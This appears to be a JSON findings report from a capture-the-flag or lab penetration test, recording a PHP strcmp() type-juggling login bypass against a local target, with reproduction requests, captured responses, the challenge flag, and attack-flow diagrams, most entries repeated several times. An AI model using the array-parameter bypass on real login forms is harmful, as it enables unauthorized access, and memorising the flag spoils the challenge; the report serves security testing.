@@ -1,0 +1,134 @@
+{
+  "meta": {
+    "created": "2026-04-14T14:58:51.451380+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "311f4d2b-44f6-498f-a198-8150505b9876",
+      "timestamp": "2026-04-14T14:58:51.451271+00:00",
+      "title": "PHP strcmp() Type Juggling Authentication Bypass",
+      "severity": "critical",
+      "target": "http://172.17.0.1:35529/index.php",
+      "description": "The login form uses PHP's strcmp() function to compare passwords. When an array is passed instead of a string (via password[]=test), strcmp() returns NULL which equals 0 in PHP loose comparison, bypassing authentication entirely.",
+      "evidence": "flag{5a33e31a-7627-4044-964f-744917d6ca5f}",
+      "tool_used": "manual",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET /index.php?username=admin&password[]=test HTTP/1.1",
+        "expected": "Returns 'Welcome Admin' with the flag"
+      }
+    },
+    {
+      "id": "8c806b90-5ba4-4c8f-ba29-10b7036d7837",
+      "timestamp": "2026-04-14T14:58:51.467210+00:00",
+      "title": "PHP strcmp() Type Juggling Authentication Bypass",
+      "severity": "critical",
+      "target": "http://172.17.0.1:35529/index.php",
+      "description": "The login form uses PHP's strcmp() function to compare passwords. When an array is passed instead of a string (via password[]=test), strcmp() returns NULL which equals 0 in PHP loose comparison, bypassing authentication entirely.",
+      "evidence": "flag{5a33e31a-7627-4044-964f-744917d6ca5f}",
+      "tool_used": "manual",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET /index.php?username=admin&password[]=test HTTP/1.1",
+        "expected": "Returns 'Welcome Admin' with the flag"
+      }
+    },
+    {
+      "id": "43ecc93f-966f-4447-a9ed-34a36fb6de93",
+      "timestamp": "2026-04-14T14:58:51.507147+00:00",
+      "title": "PHP strcmp() Type Juggling Authentication Bypass",
+      "severity": "critical",
+      "target": "http://172.17.0.1:35529/index.php",
+      "description": "The login form uses PHP's strcmp() function to compare passwords. When an array is passed instead of a string (via password[]=test), strcmp() returns NULL which equals 0 in PHP loose comparison, bypassing authentication entirely.",
+      "evidence": "flag{5a33e31a-7627-4044-964f-744917d6ca5f}",
+      "tool_used": "manual",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET /index.php?username=admin&password[]=test HTTP/1.1",
+        "expected": "Returns 'Welcome Admin' with the flag"
+      }
+    },
+    {
+      "id": "7cf0f3ea-4a64-4713-ba30-2045a7de4a9e",
+      "timestamp": "2026-04-14T14:58:56.397927+00:00",
+      "title": "PHP strcmp() Type Juggling Authentication Bypass",
+      "severity": "critical",
+      "target": "http://172.17.0.1:35529",
+      "description": "The login form uses PHP's strcmp() function to compare the submitted password with the expected password. By passing the password parameter as an array (password[]=test), strcmp() receives an array instead of a string, causing it to return NULL with a warning. In PHP's loose comparison (== 0), NULL evaluates to 0, which matches the expected return value of strcmp() when strings are equal, thus bypassing authentication.",
+      "evidence": "Request: GET /index.php?username=admin&password[]=test\nResponse: Warning: strcmp() expects parameter 1 to be string, array given in /var/www/html/index.php on line 71\nWelcome Admin\nCongratulations, here is the flag: flag{5a33e31a-7627-4044-964f-744917d6ca5f}",
+      "tool_used": "http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl 'http://172.17.0.1:35529/index.php?username=admin&password[]=test'",
+        "expected": "Response contains 'Welcome Admin' and the flag"
+      }
+    },
+    {
+      "id": "b91a4fa2-ef9f-4fa5-a915-105514863139",
+      "timestamp": "2026-04-14T14:58:56.424440+00:00",
+      "title": "PHP strcmp() Type Juggling Authentication Bypass",
+      "severity": "critical",
+      "target": "http://172.17.0.1:35529",
+      "description": "The login form uses PHP's strcmp() function to compare the submitted password with the expected password. By passing the password parameter as an array (password[]=test), strcmp() receives an array instead of a string, causing it to return NULL with a warning. In PHP's loose comparison (== 0), NULL evaluates to 0, which matches the expected return value of strcmp() when strings are equal, thus bypassing authentication.",
+      "evidence": "Request: GET /index.php?username=admin&password[]=test\nResponse: Warning: strcmp() expects parameter 1 to be string, array given in /var/www/html/index.php on line 71\nWelcome Admin\nCongratulations, here is the flag: flag{5a33e31a-7627-4044-964f-744917d6ca5f}",
+      "tool_used": "http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl 'http://172.17.0.1:35529/index.php?username=admin&password[]=test'",
+        "expected": "Response contains 'Welcome Admin' and the flag"
+      }
+    },
+    {
+      "id": "3708606b-a7df-4e26-aba4-787aa16bc3bc",
+      "timestamp": "2026-04-14T14:59:27.855192+00:00",
+      "title": "PHP strcmp() Type Juggling Authentication Bypass",
+      "severity": "critical",
+      "target": "http://172.17.0.1:35529",
+      "description": "The login form uses PHP's strcmp() function to compare the submitted password with the expected password. By passing the password parameter as an array (password[]=test), strcmp() receives an array instead of a string, causing it to return NULL with a warning. In PHP's loose comparison (== 0), NULL evaluates to 0, which matches the expected return value of strcmp() when strings are equal, thus bypassing authentication.",
+      "evidence": "Request: GET /index.php?username=admin&password[]=test\nResponse: Warning: strcmp() expects parameter 1 to be string, array given in /var/www/html/index.php on line 71\nWelcome Admin\nCongratulations, here is the flag: flag{5a33e31a-7627-4044-964f-744917d6ca5f}",
+      "tool_used": "http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl 'http://172.17.0.1:35529/index.php?username=admin&password[]=test'",
+        "expected": "Response contains 'Welcome Admin' and the flag"
+      }
+    },
+    {
+      "id": "182c4a58-54c7-4e6f-87c8-b86f12f8f2a3",
+      "timestamp": "2026-04-14T14:59:27.935409+00:00",
+      "title": "PHP strcmp() Type Juggling Authentication Bypass",
+      "severity": "critical",
+      "target": "http://172.17.0.1:35529",
+      "description": "The login form uses PHP's strcmp() function to compare the submitted password with the expected password. By passing the password parameter as an array (password[]=test), strcmp() receives an array instead of a string, causing it to return NULL with a warning. In PHP's loose comparison (== 0), NULL evaluates to 0, which matches the expected return value of strcmp() when strings are equal, thus bypassing authentication.",
+      "evidence": "Request: GET /index.php?username=admin&password[]=test\nResponse: Warning: strcmp() expects parameter 1 to be string, array given in /var/www/html/index.php on line 71\nWelcome Admin\nCongratulations, here is the flag: flag{5a33e31a-7627-4044-964f-744917d6ca5f}",
+      "tool_used": "http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl 'http://172.17.0.1:35529/index.php?username=admin&password[]=test'",
+        "expected": "Response contains 'Welcome Admin' and the flag"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "5103b87d-eb94-487d-9934-9a45a5a33d9c",
+      "timestamp": "2026-04-14T15:01:50.433669+00:00",
+      "title": "PHP strcmp() Authentication Bypass Attack Flow",
+      "mermaid": "flowchart TD\n    A[Attacker Browser] -->|GET /index.php| B[Apache 2.4.25]\n    B --> C[PHP 5.6.40]\n    C --> D{strcmp\\(username, password\\)}\n    D -->|password is array| E[strcmp returns NULL]\n    E --> F[NULL == 0 in loose comparison]\n    F --> G[Authentication Bypass]\n    G --> H[Welcome Admin]\n    H --> I[Flag: flag{5a33e31a-7627-4044-964f-744917d6ca5f}]"
+    },
+    {
+      "id": "939d9188-c7ca-45f7-80e9-b2081bb3d6b5",
+      "timestamp": "2026-04-14T15:01:50.523986+00:00",
+      "title": "PHP strcmp() Authentication Bypass Attack Flow",
+      "mermaid": "flowchart TD\n    A[Attacker Browser] -->|GET /index.php| B[Apache 2.4.25]\n    B --> C[PHP 5.6.40]\n    C --> D{strcmp\\(username, password\\)}\n    D -->|password is array| E[strcmp returns NULL]\n    E --> F[NULL == 0 in loose comparison]\n    F --> G[Authentication Bypass]\n    G --> H[Welcome Admin]\n    H --> I[Flag: flag{5a33e31a-7627-4044-964f-744917d6ca5f}]"
+    }
+  ]
+}
